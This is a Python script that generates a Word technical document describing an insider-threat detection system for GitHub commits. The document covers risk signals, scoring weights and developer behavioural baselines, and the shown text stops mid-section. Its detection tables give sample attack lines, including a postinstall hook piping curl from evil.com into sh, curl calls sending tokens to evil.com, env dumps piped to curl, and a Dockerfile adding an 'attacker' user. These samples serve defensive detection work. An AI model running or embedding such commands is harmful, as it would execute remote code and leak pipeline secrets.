"""Generate GitHub Monitor – Insider Threat Detection Technical Document as Word (.docx)"""

from docx import Document
from docx.shared import Inches, Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
import os

doc = Document()

# ── Page margins ──
for section in doc.sections:
    section.top_margin = Cm(2.5)
    section.bottom_margin = Cm(2.5)
    section.left_margin = Cm(2.5)
    section.right_margin = Cm(2.5)

# ── Styles ──
style = doc.styles['Normal']
style.font.name = 'Calibri'
style.font.size = Pt(11)
style.paragraph_format.space_after = Pt(6)

for level in range(1, 4):
    h = doc.styles[f'Heading {level}']
    h.font.name = 'Calibri'
    h.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)

doc.styles['Heading 1'].font.size = Pt(20)
doc.styles['Heading 2'].font.size = Pt(15)
doc.styles['Heading 3'].font.size = Pt(12)


def add_code_block(text):
    """Add a formatted code block"""
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(6)
    p.paragraph_format.space_after = Pt(6)
    p.paragraph_format.left_indent = Cm(0.5)
    run = p.add_run(text)
    run.font.name = 'Consolas'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x2d, 0x2d, 0x2d)
    shading = run._element.get_or_add_rPr()
    shd = shading.makeelement(qn('w:shd'), {
        qn('w:val'): 'clear',
        qn('w:color'): 'auto',
        qn('w:fill'): 'F5F5F5'
    })
    shading.append(shd)
    return p


def add_table(headers, rows):
    """Add a formatted table"""
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.style = 'Light Grid Accent 1'
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = h
        for p in cell.paragraphs:
            p.alignment = WD_ALIGN_PARAGRAPH.LEFT
            for run in p.runs:
                run.bold = True
                run.font.size = Pt(10)

    for r_idx, row in enumerate(rows):
        for c_idx, val in enumerate(row):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = str(val)
            for p in cell.paragraphs:
                for run in p.runs:
                    run.font.size = Pt(10)

    doc.add_paragraph()
    return table


def add_bullet(text, bold_prefix=None):
    """Add a bullet point, optionally with a bold prefix"""
    p = doc.add_paragraph(style='List Bullet')
    if bold_prefix:
        run = p.add_run(bold_prefix)
        run.bold = True
        p.add_run(text)
    else:
        p.add_run(text)
    return p


# ═══════════════════════════════════════════════════════════════════════
# COVER PAGE
# ═══════════════════════════════════════════════════════════════════════
doc.add_paragraph()
doc.add_paragraph()
title = doc.add_paragraph()
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = title.add_run('GitHub Monitor')
run.font.size = Pt(32)
run.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)
run.bold = True

subtitle = doc.add_paragraph()
subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = subtitle.add_run('Insider Threat Detection System\nTechnical Document')
run.font.size = Pt(18)
run.font.color.rgb = RGBColor(0x4a, 0x4a, 0x6a)

doc.add_paragraph()
meta = doc.add_paragraph()
meta.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = meta.add_run('AppSec Platform\nConfidential - Internal Use Only')
run.font.size = Pt(12)
run.font.color.rgb = RGBColor(0x88, 0x88, 0x88)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# TABLE OF CONTENTS
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('Table of Contents', level=1)
toc_items = [
    '1. Executive Overview',
    '2. System Architecture',
    '3. Stage 1 - Repository Setup & GitHub Integration',
    '4. Stage 2 - Commit Scanning & Analysis',
    '   4.1 Metadata Signal Detection',
    '   4.2 SAST Rule Matching on Diff',
    '   4.3 Sensitive File Detection',
    '   4.4 Binary File Detection',
    '   4.5 Dependency Tampering Detection',
    '   4.6 CI/CD Pipeline Tampering Detection',
    '   4.7 Configuration Weakening Detection',
    '   4.8 Suspicious Commit Messages',
    '   4.9 Risk Score Aggregation',
    '5. Stage 3 - Developer Behavioral Baselines',
    '   5.1 Baseline Metrics',
    '   5.2 Baseline Status Levels',
    '   5.3 Baseline Computation',
    '6. Stage 4 - Anomaly Detection',
    '   6.1 Off-Hours Deviation',
    '   6.2 Large Commit Size',
    '   6.3 Risk Spike',
    '7. Stage 5 - AI Threat Assessment',
    '   7.1 Prompt Engineering',
    '   7.2 Threat Level Classification',
    '8. Developer Risk Profiles',
    '9. Dashboard & Reporting',
    '10. Database Schema',
    '11. Integration with Other Platform Features',
    '12. File Reference',
]
for item in toc_items:
    p = doc.add_paragraph(item)
    p.paragraph_format.space_after = Pt(2)
    p.runs[0].font.size = Pt(11)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 1. EXECUTIVE OVERVIEW
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('1. Executive Overview', level=1)

doc.add_paragraph(
    'The GitHub Monitor is an insider threat detection system integrated into the AppSec Platform. '
    'It continuously monitors GitHub repositories for risky commits, suspicious developer behavior, '
    'sensitive file exposure, supply chain attacks, and CI/CD pipeline tampering.'
)
doc.add_paragraph(
    'The system operates through a multi-layered analysis pipeline that combines static pattern matching, '
    'behavioral baselines with statistical anomaly detection, and AI-powered threat assessment to provide '
    'comprehensive insider threat visibility.'
)

doc.add_heading('Key Capabilities', level=2)
capabilities = [
    ('Automated Commit Scanning: ', 'Every commit is analyzed against 10+ signal categories including SAST rules, sensitive file detection, dependency tampering, CI/CD manipulation, and configuration weakening.'),
    ('Behavioral Baselines: ', 'Per-developer rolling baselines track commit timing, size, and risk patterns. Anomalies are detected using z-score analysis when commits deviate from established patterns.'),
    ('AI Threat Assessment: ', 'On-demand AI analysis provides intent classification (intentional insider, suspicious, negligent, false positive) with confidence scores, impact summaries, and recommended actions.'),
    ('Developer Risk Profiles: ', 'Continuous risk scoring per developer with trend tracking (increasing, decreasing, stable) across all monitored repositories.'),
    ('Supply Chain Protection: ', 'Detection of typosquatting packages, vulnerable version pinning, custom registry URLs, and removal of security dependencies.'),
    ('CI/CD Pipeline Security: ', 'Monitors for disabled security scans, secret exfiltration from CI environments, untrusted Docker base images, and deployment target changes.'),
]
for prefix, text in capabilities:
    add_bullet(text, prefix)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 2. SYSTEM ARCHITECTURE
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('2. System Architecture', level=1)

doc.add_paragraph('The GitHub Monitor follows a 5-stage pipeline architecture:')

add_code_block(
    'PIPELINE OVERVIEW\n'
    '=================\n\n'
    '[Stage 1]  Repository Setup & GitHub Integration\n'
    '    |       PAT authentication, repo validation, connection testing\n'
    '    v\n'
    '[Stage 2]  Commit Scanning & Multi-Signal Analysis\n'
    '    |       10+ signal detectors, SAST rules, risk scoring\n'
    '    v\n'
    '[Stage 3]  Developer Behavioral Baselines\n'
    '    |       Rolling 60-commit window, timing/size/risk metrics\n'
    '    v\n'
    '[Stage 4]  Anomaly Detection\n'
    '    |       Z-score analysis, deviation flags, severity assignment\n'
    '    v\n'
    '[Stage 5]  AI Threat Assessment (On-Demand)\n'
    '            Intent classification, impact analysis, recommendations'
)

doc.add_heading('Data Flow', level=2)
add_code_block(
    'GitHub API                        AppSec Platform\n'
    '+-----------+                     +----------------------------+\n'
    '|  Commits  | ---PAT auth--->    | GitHubClient               |\n'
    '|  Diffs    |                     |   get_recent_commits()     |\n'
    '|  Files    |                     |   get_commit_detail()      |\n'
    '+-----------+                     |   get_commit_diff()        |\n'
    '                                  +----------+-----------------+\n'
    '                                             |\n'
    '                                             v\n'
    '                                  +----------------------------+\n'
    '                                  | CommitAnalyzer             |\n'
    '                                  |   10 signal detectors      |\n'
    '                                  |   SAST insider_threat rules|\n'
    '                                  |   Risk score (0-10)        |\n'
    '                                  +----------+-----------------+\n'
    '                                             |\n'
    '                                  +----------+-----------------+\n'
    '                                  | BaselineEngine             |\n'
    '                                  |   Per-developer baselines  |\n'
    '                                  |   Z-score anomaly detection|\n'
    '                                  +----------+-----------------+\n'
    '                                             |\n'
    '                                  +----------+-----------------+\n'
    '                                  | AI Threat Assessment       |\n'
    '                                  |   (on-demand per commit)   |\n'
    '                                  |   Intent classification    |\n'
    '                                  +----------------------------+'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 3. STAGE 1 - REPOSITORY SETUP
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('3. Stage 1 - Repository Setup & GitHub Integration', level=1)

doc.add_paragraph(
    'The first stage establishes connectivity to GitHub via a Personal Access Token (PAT) and '
    'allows users to add repositories for continuous monitoring.'
)

doc.add_heading('GitHub Client', level=2)
doc.add_paragraph(
    'The GitHubClient class (services/github_client.py) provides an async REST API client for GitHub. '
    'It handles authentication, pagination, and rate limiting.'
)

doc.add_heading('API Methods', level=3)
add_table(
    ['Method', 'Purpose', 'Endpoint'],
    [
        ['test_connection()', 'Validate PAT', 'GET /user'],
        ['get_repos(org)', 'List org repositories', 'GET /orgs/{org}/repos'],
        ['get_repo(owner, repo)', 'Get repo metadata', 'GET /repos/{owner}/{repo}'],
        ['get_recent_commits()', 'Commits since N hours', 'GET /repos/.../commits?since='],
        ['get_all_commits()', 'All commits (paginated)', 'GET /repos/.../commits'],
        ['get_commit_detail()', 'Full commit with files', 'GET /repos/.../commits/{sha}'],
        ['get_commit_diff()', 'Raw unified diff', 'GET /repos/.../commits/{sha} (diff header)'],
    ]
)

doc.add_heading('Repository Onboarding Flow', level=2)
doc.add_paragraph('1. User enters GitHub PAT and default organization in Settings.')
doc.add_paragraph('2. System validates PAT by calling GET /user via test_connection().')
doc.add_paragraph('3. User adds a repository by owner/repo name (e.g., "acme/web-app").')
doc.add_paragraph('4. System validates the repository exists via get_repo().')
doc.add_paragraph('5. Repository is stored in github_monitored_repos with active=1.')
doc.add_paragraph('6. User triggers initial scan ("Scan Now") or waits for scheduled scan.')

doc.add_heading('Settings Storage', level=3)
doc.add_paragraph(
    'The GitHub PAT is stored in the platform Settings table with is_secret=True, '
    'under category "github". The default organization is stored as a separate setting.'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 4. STAGE 2 - COMMIT SCANNING
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('4. Stage 2 - Commit Scanning & Analysis', level=1)

doc.add_paragraph(
    'The CommitAnalyzer class (services/commit_analyzer.py, 705 lines) is the core analysis engine. '
    'Every commit is run through 10 independent signal detectors, and the results are aggregated '
    'into a risk score from 0-10.'
)

doc.add_heading('Analysis Pipeline per Commit', level=2)
add_code_block(
    'For each commit:\n'
    '  1. Fetch commit detail (files, stats)\n'
    '  2. Fetch unified diff\n'
    '  3. analyze_commit(commit_data, diff_text, is_force_push)\n'
    '     |\n'
    '     +-- _check_metadata_signals()    -> off_hours, author_mismatch, unsigned\n'
    '     +-- Force push check             -> force_push signal\n'
    '     +-- Large deletion check         -> >500 lines deleted\n'
    '     +-- _scan_diff()                 -> SAST insider_threat rules\n'
    '     +-- _check_sensitive_files()     -> .env, keys, certs, etc.\n'
    '     +-- _check_commit_message()      -> vague/empty on large commits\n'
    '     +-- _check_binary_files()        -> .exe, .dll, .zip, .sql, etc.\n'
    '     +-- _check_dependency_tampering()-> typosquat, vuln pinning\n'
    '     +-- _check_cicd_tampering()      -> scan disabling, secret exfil\n'
    '     +-- _check_config_weakening()    -> CORS, auth, TLS weakening\n'
    '     |\n'
    '     v\n'
    '  CommitAnalysisResult(risk_score, risk_level, signals, findings, sensitive_files)'
)

# 4.1 Metadata Signals
doc.add_heading('4.1 Metadata Signal Detection', level=2)
doc.add_paragraph(
    'The first layer of analysis examines commit metadata for behavioral red flags, '
    'without even looking at the code changes.'
)

add_table(
    ['Signal', 'Detection Logic', 'Risk Score'],
    [
        ['off_hours', 'Commit before 7:00 AM or after 9:00 PM UTC', '+1.0'],
        ['author_committer_mismatch', 'Author email != committer email (excludes noreply@)', '+1.5'],
        ['unsigned_commit', 'GPG verification.verified is false', '+0.5'],
        ['force_push', 'Passed from caller when force push detected', '+2.0'],
        ['large_deletion', 'More than 500 lines deleted in commit', '+1.0'],
    ]
)

doc.add_heading('Code: Metadata Check', level=3)
add_code_block(
    'def _check_metadata_signals(self, commit_data: Dict) -> List[str]:\n'
    '    signals = []\n'
    '    commit = commit_data.get("commit", {})\n\n'
    '    # Off-hours check (before 7am or after 9pm UTC)\n'
    '    author_info = commit.get("author", {})\n'
    '    committed_at_str = author_info.get("date", "")\n'
    '    if committed_at_str:\n'
    '        committed_at = datetime.fromisoformat(committed_at_str.replace("Z", "+00:00"))\n'
    '        hour = committed_at.hour\n'
    '        if hour < 7 or hour >= 21:\n'
    '            signals.append("off_hours")\n\n'
    '    # Author / committer mismatch\n'
    '    author_email = commit.get("author", {}).get("email", "")\n'
    '    committer_email = commit.get("committer", {}).get("email", "")\n'
    '    if author_email and committer_email and author_email.lower() != committer_email.lower():\n'
    '        if "noreply" not in committer_email.lower():\n'
    '            signals.append("author_committer_mismatch")\n\n'
    '    # Unsigned commit\n'
    '    verification = commit.get("verification", {})\n'
    '    if not verification.get("verified", False):\n'
    '        signals.append("unsigned_commit")\n'
    '    return signals'
)

# 4.2 SAST Rules
doc.add_heading('4.2 SAST Rule Matching on Diff', level=2)
doc.add_paragraph(
    'The analyzer loads all enabled custom_rules with category="insider_threat" from the database and '
    'runs them against every added line (+) in the commit diff. This integrates directly with the '
    'platform\'s Custom Rules engine.'
)
doc.add_paragraph(
    'For each match, the system captures the rule name, severity, file path, line number, '
    'matched text (truncated to 200 chars), and a diff snippet of +/-5 surrounding lines (truncated to 1500 chars).'
)

doc.add_heading('Risk Score per Finding', level=3)
add_table(
    ['Finding Severity', 'Score Contribution'],
    [
        ['Critical', '+2.5'],
        ['High', '+1.5'],
        ['Medium/Low', '+0.5'],
    ]
)

# 4.3 Sensitive Files
doc.add_heading('4.3 Sensitive File Detection', level=2)
doc.add_paragraph(
    'Every file touched by a commit is checked against a comprehensive list of sensitive file patterns. '
    'Matches generate both a signal and a dedicated SensitiveFileAlert stored in github_sensitive_file_alerts.'
)

doc.add_heading('Sensitive File Patterns', level=3)
add_table(
    ['Category', 'Patterns'],
    [
        ['Environment Files', '.env, .env.*'],
        ['Secrets', 'secret, password, passwd, .htpasswd'],
        ['SSH Keys', 'id_rsa, id_dsa, id_ecdsa, id_ed25519, authorized_keys'],
        ['Certificates', '.pem, .pfx, .p12, .key'],
        ['Credentials', 'aws_credentials, credentials.json, token.json'],
        ['Password Stores', '.kdbx, keystore, truststore'],
        ['System Files', 'shadow'],
    ]
)
doc.add_paragraph('Score: +1.5 per sensitive file, capped at +3.0 total.')

# 4.4 Binary Files
doc.add_heading('4.4 Binary File Detection', level=2)
doc.add_paragraph(
    'Binary files added or modified in source repositories are suspicious as they may contain '
    'compiled malware, data exfiltration archives, or database dumps.'
)

add_table(
    ['Category', 'Extensions'],
    [
        ['Executables', '.exe, .dll, .so, .dylib, .bin, .com, .msi, .app'],
        ['Archives', '.zip, .tar, .tar.gz, .tgz, .rar, .7z, .bz2'],
        ['Database Dumps', '.sql, .sqlite, .sqlite3, .dump, .bak'],
        ['Compiled/Bytecode', '.class, .pyc, .o, .obj, .wasm'],
    ]
)
doc.add_paragraph('Score: +1.0 per binary file, capped at +2.0 total.')

# 4.5 Dependency Tampering
doc.add_heading('4.5 Dependency Tampering Detection', level=2)
doc.add_paragraph(
    'Changes to dependency manifest files (package.json, requirements.txt, go.mod, etc.) are '
    'scrutinized for supply chain attack indicators. This is a critical defense against software '
    'supply chain compromise.'
)

doc.add_heading('Monitored Dependency Files', level=3)
add_code_block(
    'DEPENDENCY_FILES = {\n'
    '    "package.json", "package-lock.json", "yarn.lock",\n'
    '    "requirements.txt", "Pipfile", "Pipfile.lock", "poetry.lock", "setup.py", "setup.cfg",\n'
    '    "Gemfile", "Gemfile.lock",\n'
    '    "go.mod", "go.sum",\n'
    '    "pom.xml", "build.gradle", "build.gradle.kts",\n'
    '    "Cargo.toml", "Cargo.lock",\n'
    '    "composer.json", "composer.lock",\n'
    '    "pubspec.yaml", "pubspec.lock",\n'
    '}'
)

doc.add_heading('Tampering Patterns', level=3)
add_table(
    ['Pattern Type', 'Detection Logic', 'Example'],
    [
        ['Typosquatting', 'Known attack package names with character substitution', 'lod4sh, requ3sts, crypt0, col0rs, f4ker'],
        ['Vulnerable Version Pinning', 'Dependencies pinned to known-vulnerable versions', 'django<=2.x, log4j 2.0-2.14, lodash 0-3.x'],
        ['Custom Registry', 'Non-standard registry URLs (potential malicious mirror)', 'registry=https://evil.npmjs.org'],
        ['Post-Install Scripts', 'preinstall/postinstall hooks in package.json', '"postinstall": "curl evil.com | sh"'],
        ['Security Dep Removal', 'Removal of security-related packages', 'Removing helmet, bcrypt, bandit, snyk, eslint-plugin-security'],
    ]
)

doc.add_heading('Monitored Security Dependencies', level=3)
add_code_block(
    'SECURITY_DEPENDENCIES = [\n'
    '    "helmet", "csurf", "cors", "express-rate-limit", "hpp",\n'
    '    "bcrypt", "argon2", "scrypt",\n'
    '    "jsonwebtoken", "passport", "express-session",\n'
    '    "django-cors-headers", "django-csp",\n'
    '    "safety", "bandit", "semgrep",\n'
    '    "snyk", "audit", "eslint-plugin-security",\n'
    ']'
)
doc.add_paragraph('Score: +1.5 for any dependency tampering detected.')

doc.add_page_break()

# 4.6 CI/CD Tampering
doc.add_heading('4.6 CI/CD Pipeline Tampering Detection', level=2)
doc.add_paragraph(
    'Modifications to CI/CD pipeline configuration files are analyzed for patterns that could '
    'indicate an attacker weakening the build/deploy security posture or exfiltrating secrets.'
)

doc.add_heading('Monitored CI/CD Files', level=3)
add_code_block(
    'CICD_FILE_PATTERNS = [\n'
    '    r".github/workflows/.*\\.ya?ml$",    # GitHub Actions\n'
    '    r"Jenkinsfile$",                      # Jenkins\n'
    '    r".gitlab-ci\\.ya?ml$",               # GitLab CI\n'
    '    r"azure-pipelines\\.ya?ml$",          # Azure Pipelines\n'
    '    r".circleci/config\\.ya?ml$",         # CircleCI\n'
    '    r"Dockerfile$",                       # Docker\n'
    '    r"docker-compose.*\\.ya?ml$",         # Docker Compose\n'
    '    r".travis\\.ya?ml$",                  # Travis CI\n'
    '    r"bitbucket-pipelines\\.ya?ml$",      # Bitbucket\n'
    ']'
)

doc.add_heading('Tampering Patterns', level=3)
add_table(
    ['Pattern', 'Signal Label', 'Example'],
    [
        ['Commenting out security tools', 'security_scan_disabled', '# snyk test, # trivy scan'],
        ['Disabling checks via env vars', 'security_check_disabled', 'SKIP_SCAN=true, DISABLE_SAST=1'],
        ['--no-verify flag', 'hook_bypass', 'git commit --no-verify'],
        ['Echoing secrets to stdout', 'secret_exfil_ci', 'echo $SECRET_KEY | curl ...'],
        ['curl with secret variables', 'secret_exfil_ci', 'curl -H "Auth: $TOKEN" evil.com'],
        ['Environment dump', 'env_dump_ci', 'printenv | ..., env | curl'],
        ['Production deploy changes', 'prod_deploy_change', 'deploy to production, push to live'],
        ['Untrusted Docker base image', 'untrusted_base_image', 'FROM random-registry/image'],
        ['Adding users in Dockerfile', 'docker_user_add', 'RUN useradd attacker'],
        ['Exposing extra ports', 'port_exposed', 'EXPOSE 4444, EXPOSE 9999'],
    ]
)

doc.add_paragraph(
    'Additionally, removed lines in CI/CD files are checked for security tool references. '
    'If a removed line references any of the following tools, it flags as "security_tool_removed": '
    'snyk, sonar, trivy, semgrep, bandit, brakeman, safety, gitleaks, trufflehog, checkov, tfsec, '
    'grype, syft, cosign.'
)
doc.add_paragraph('Score: +1.5 per CI/CD tampering instance, capped at +3.0 total.')

# 4.7 Config Weakening
doc.add_heading('4.7 Configuration Weakening Detection', level=2)
doc.add_paragraph(
    'Security-relevant configuration files are monitored for changes that weaken the application\'s '
    'security posture. This includes both explicit config files and any file with config-like naming.'
)

doc.add_heading('Monitored Config Files', level=3)
add_code_block(
    'CONFIG_SECURITY_FILES = [\n'
    '    r".gitignore$",           # Tracking rules\n'
    '    r"CODEOWNERS$",           # Review protection\n'
    '    r".github/CODEOWNERS$",   # GitHub-specific\n'
    '    r"branch-protection",     # Branch rules\n'
    '    r"renovate.json",         # Dependency updates\n'
    '    r".dependabot/",          # Auto-update config\n'
    ']\n\n'
    '# Also checks any file containing:\n'
    '# "config", "settings", "nginx", "apache", "cors",\n'
    '# ".cfg", ".ini", ".toml", ".yaml", ".yml"'
)

doc.add_heading('Weakening Patterns', level=3)
add_table(
    ['Pattern', 'Signal Label', 'What It Detects'],
    [
        ['CORS wildcard', 'cors_wildcard', 'Access-Control-Allow-Origin: * or allow_origins=["*"]'],
        ['Session timeout extension', 'session_timeout_extended', 'session_timeout=86400/604800/31536000'],
        ['MFA/2FA disabled', 'mfa_disabled', 'MFA=false, 2fa=disabled, two_factor=off'],
        ['Auth disabled', 'auth_disabled', 'require_auth=false, auth_required=0'],
        ['Rate limiting removed', 'rate_limit_disabled', 'rate_limit=false, throttle=none'],
        ['Debug mode enabled', 'debug_enabled', 'DEBUG=true, debug=1'],
        ['SSL verification disabled', 'ssl_verify_disabled', 'verify_ssl=false, SSL_VERIFY=0'],
        ['Weak TLS version', 'weak_tls', 'TLS=1.0, ssl=1.1, SSLv3'],
    ]
)

doc.add_heading('Special Cases', level=3)
doc.add_paragraph(
    '.gitignore monitoring: When security-relevant patterns (.env, .pem, .key, secret, credential, '
    'token, password) are REMOVED from .gitignore, it means previously ignored sensitive files could '
    'now be tracked by git. This is flagged as "gitignore_sensitive_unignored".'
)
doc.add_paragraph(
    'CODEOWNERS monitoring: Removed lines from CODEOWNERS files indicate that code review protection '
    'has been weakened for certain paths. Flagged as "codeowner_removed".'
)
doc.add_paragraph('Score: +1.0 per config weakening instance, capped at +2.0 total.')

# 4.8 Suspicious Messages
doc.add_heading('4.8 Suspicious Commit Messages', level=2)
doc.add_paragraph(
    'Large commits (>50 lines changed) with vague or empty commit messages are flagged. '
    'This detects attempts to sneak significant changes under the radar.'
)

add_table(
    ['Type', 'Detection', 'Example'],
    [
        ['Empty message', 'Message length < 4 characters', '"..", "", "ok"'],
        ['Vague message', 'Single-word generic term on large commit', '"fix", "update", "wip", "tmp", "stuff", "asdf", "done"'],
    ]
)
doc.add_paragraph('Score: +0.5 for suspicious message detected.')

doc.add_page_break()

# 4.9 Risk Score Aggregation
doc.add_heading('4.9 Risk Score Aggregation', level=2)
doc.add_paragraph(
    'All signal scores are summed and capped at 10.0 to produce the final risk score. '
    'The score maps to a risk level for display and filtering.'
)

doc.add_heading('Complete Score Weight Table', level=3)
add_table(
    ['Signal', 'Weight', 'Cap', 'Accumulated?'],
    [
        ['Critical SAST finding', '+2.5', 'No cap', 'Per finding'],
        ['High SAST finding', '+1.5', 'No cap', 'Per finding'],
        ['Medium/Low SAST finding', '+0.5', 'No cap', 'Per finding'],
        ['Off-hours commit', '+1.0', '-', 'Once'],
        ['Author/committer mismatch', '+1.5', '-', 'Once'],
        ['Unsigned commit', '+0.5', '-', 'Once'],
        ['Force push', '+2.0', '-', 'Once'],
        ['Large deletion (>500 lines)', '+1.0', '-', 'Once'],
        ['Suspicious message', '+0.5', '-', 'Once'],
        ['Sensitive file', '+1.5', '3.0', 'Per file'],
        ['Binary file', '+1.0', '2.0', 'Per file'],
        ['Dependency tampering', '+1.5', '-', 'Once'],
        ['CI/CD tampering', '+1.5', '3.0', 'Per instance'],
        ['Config weakening', '+1.0', '2.0', 'Per instance'],
    ]
)

doc.add_heading('Risk Level Thresholds', level=3)
add_table(
    ['Risk Level', 'Score Range', 'Color', 'Action Required'],
    [
        ['Critical', '>= 7.0', 'Red', 'Immediate security review required'],
        ['High', '>= 4.0', 'Orange', 'Priority investigation recommended'],
        ['Medium', '>= 2.0', 'Yellow', 'Monitor and review when possible'],
        ['Low', '>= 0.5', 'Blue', 'Informational, low concern'],
        ['Clean', '< 0.5', 'Green', 'No action needed'],
    ]
)

doc.add_heading('Code: Risk Score Calculation', level=3)
add_code_block(
    'def analyze_commit(self, commit_data, diff_text, is_force_push=False):\n'
    '    signals = []\n'
    '    score = 0.0\n\n'
    '    # 1. Metadata signals\n'
    '    meta_signals = self._check_metadata_signals(commit_data)\n'
    '    signals.extend(meta_signals)\n'
    '    if "off_hours" in meta_signals: score += 1.0\n'
    '    if "author_committer_mismatch" in meta_signals: score += 1.5\n'
    '    if "unsigned_commit" in meta_signals: score += 0.5\n\n'
    '    # 2. Force push / Large deletion\n'
    '    if is_force_push: score += 2.0\n'
    '    if deletions > 500: score += 1.0\n\n'
    '    # 3. SAST findings\n'
    '    findings = self._scan_diff(diff_text)\n'
    '    for f in findings:\n'
    '        score += {critical: 2.5, high: 1.5, else: 0.5}\n\n'
    '    # 4. Sensitive files (1.5 each, cap 3.0)\n'
    '    # 5. Suspicious message (+0.5)\n'
    '    # 6. Binary files (1.0 each, cap 2.0)\n'
    '    # 7. Dependency tampering (+1.5)\n'
    '    # 8. CI/CD tampering (1.5 each, cap 3.0)\n'
    '    # 9. Config weakening (1.0 each, cap 2.0)\n\n'
    '    score = min(round(score, 2), 10.0)  # Cap at 10\n'
    '    return CommitAnalysisResult(risk_score, risk_level, signals, findings, sensitive_files)'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 5. STAGE 3 - BEHAVIORAL BASELINES
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('5. Stage 3 - Developer Behavioral Baselines', level=1)

doc.add_paragraph(
    'The BaselineEngine (services/baseline_engine.py, 362 lines) computes rolling behavioral baselines '
    'per developer from their commit history. These baselines establish what "normal" looks like for each '
    'developer, enabling statistical anomaly detection.'
)

# 5.1 Baseline Metrics
doc.add_heading('5.1 Baseline Metrics', level=2)

add_table(
    ['Metric Category', 'Metric', 'How Computed'],
    [
        ['Timing', 'mean_commit_hour', 'Average UTC hour across recent commits'],
        ['Timing', 'std_commit_hour', 'Standard deviation of commit hours (floor: 1.0)'],
        ['Timing', 'typical_hour_start', 'mean - 1.5 * std, clamped to 0-23'],
        ['Timing', 'typical_hour_end', 'mean + 1.5 * std, clamped to 0-23'],
        ['Size', 'avg_additions', 'Mean lines added per commit'],
        ['Size', 'avg_deletions', 'Mean lines deleted per commit'],
        ['Size', 'avg_files_changed', 'Mean files changed per commit'],
        ['Size', 'p90_additions', '90th percentile of lines added'],
        ['Size', 'p90_deletions', '90th percentile of lines deleted'],
        ['Risk', 'avg_risk_score', 'Mean historical risk score'],
        ['Activity', 'avg_commits_per_week', 'Commits / (span_days / 7)'],
    ]
)

# 5.2 Baseline Status
doc.add_heading('5.2 Baseline Status Levels', level=2)

add_table(
    ['Status', 'Commit Count', 'Capabilities'],
    [
        ['insufficient', '< 5 commits', 'No anomaly detection active'],
        ['partial', '5-19 commits', 'Basic hour range check (low severity only)'],
        ['established', '>= 20 commits', 'Full z-score analysis, all anomaly types active'],
    ]
)

# 5.3 Computation
doc.add_heading('5.3 Baseline Computation', level=2)
doc.add_paragraph(
    'Baselines are recomputed after every new commit scan using the most recent 60 commits '
    '(BASELINE_WINDOW=60). The computation uses an UPSERT pattern - creating the baseline on '
    'first commit or updating the existing one.'
)

doc.add_heading('Configuration Constants', level=3)
add_code_block(
    'MIN_COMMITS_PARTIAL = 5       # Basic baseline activation\n'
    'MIN_COMMITS_ESTABLISHED = 20  # Full confidence baseline\n'
    'BASELINE_WINDOW = 60          # Rolling window size\n'
    'SIZE_MULTIPLIER = 5.0         # Flag if > 5x baseline avg\n'
    'SIZE_MIN_BASELINE = 20        # Minimum avg to avoid noise\n'
    'TIMING_Z_MEDIUM = 2.0         # Z-score for medium severity\n'
    'TIMING_Z_HIGH = 3.0           # Z-score for high severity\n'
    'RISK_MULTIPLIER = 3.0         # Flag if risk > 3x baseline\n'
    'RISK_MIN_SCORE = 2.5          # Minimum score to flag'
)

doc.add_heading('Code: Baseline Computation', level=3)
add_code_block(
    'def compute_and_store(self, author_email: str) -> Dict:\n'
    '    # Fetch last 60 commits for this developer\n'
    '    SELECT committed_at, additions, deletions, files_changed, risk_score\n'
    '    FROM github_commit_scans\n'
    '    WHERE author_email = ?\n'
    '    ORDER BY committed_at DESC LIMIT 60\n\n'
    '    # Determine status based on count\n'
    '    status = "insufficient" if n < 5 else "partial" if n < 20 else "established"\n\n'
    '    # Timing: extract UTC hours, compute mean/std\n'
    '    mean_hour = mean(hours)\n'
    '    std_hour = max(std(hours), 1.0)  # Floor at 1 to avoid div-by-zero\n'
    '    hour_start = max(0, int(mean_hour - 1.5 * std_hour))\n'
    '    hour_end = min(23, int(mean_hour + 1.5 * std_hour))\n\n'
    '    # Size: mean and P90 for additions, deletions, files\n'
    '    # Risk: mean of historical risk scores\n'
    '    # Activity: commits / (span_days / 7.0)\n\n'
    '    # UPSERT into github_developer_baselines\n'
    '    INSERT ... ON CONFLICT(author_email) DO UPDATE SET ...'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 6. STAGE 4 - ANOMALY DETECTION
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('6. Stage 4 - Anomaly Detection', level=1)

doc.add_paragraph(
    'Anomaly detection compares each new commit against the developer\'s pre-update baseline. '
    'This is critical - the comparison happens BEFORE the baseline is recomputed with the new commit, '
    'ensuring the new commit is measured against the established normal behavior.'
)

doc.add_heading('Detection Flow', level=2)
add_code_block(
    '1. New commit scanned -> CommitAnalysisResult generated\n'
    '2. detect_and_store() called with commit metrics\n'
    '3. Load CURRENT baseline (before update)\n'
    '4. Compare commit vs baseline for each anomaly type\n'
    '5. Store detected anomalies in github_developer_anomalies\n'
    '6. THEN compute_and_store() updates baseline with new commit'
)

# 6.1 Off-Hours
doc.add_heading('6.1 Off-Hours Deviation', level=2)
doc.add_paragraph(
    'Detects when a developer commits outside their established normal working hours.'
)

add_table(
